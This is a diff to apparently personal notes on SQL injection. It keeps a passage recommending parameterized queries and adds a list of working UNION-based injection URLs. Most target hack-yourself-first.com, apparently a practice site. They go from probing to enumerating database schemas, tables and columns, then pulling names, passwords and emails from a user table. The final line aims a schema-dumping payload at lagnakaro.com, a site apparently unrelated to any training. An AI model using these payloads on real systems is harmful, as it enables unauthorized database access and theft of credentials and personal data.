@@ -150,3 +150,19 @@ Parameterized queries can be used for any situation where untrusted input appear
 
 For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted. 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+SQL injection complete process with payloads: 
+
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' --
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' ORDER BY 2 --
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=' union SELECT 1, schema_name from INformation_schema.schemata --   || Find Database 
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union SELECT 1, table_name from INformation_schema.tables --  || Common tables 
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union SELECT 1, column_name from INformation_schema.columns --  || Common columns 
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union SELECT 1, table_name from INformation_schema.tables where table_schema='sys' -- || tables from sys db
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union SELECT 1, column_name from information_schema.columns where table_schema = 'sys' --  || columns from sys db 
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union SELECT 1, table_name from INformation_schema.tables where table_schema='dbo' --  || tables from dbo db
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union SELECT 1, column_name from information_schema.columns where table_schema = 'dbo' --  || columns from dbo db 
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union SELECT 1, concat(table_name,0x0a,column_name) from information_schema.columns where table_schema = 'dbo' --  || tables&columns  from dbo db 
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union SELECT 1, column_name from information_schema.columns where table_name = 'UserProfile' --  || columns from specific table 
+http://hack-yourself-first.com/CarsByCylinders?Cylinders=Ball' union select 1, concat(FirstName,'--',0x0a,Password,'--',Email) COLLATE DATABASE_DEFAULT from dbo.UserProfile --   || Specific column data 
+https://www.lagnakaro.com/wedding-resources.php?id=1000000000000000000000001' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata -- 
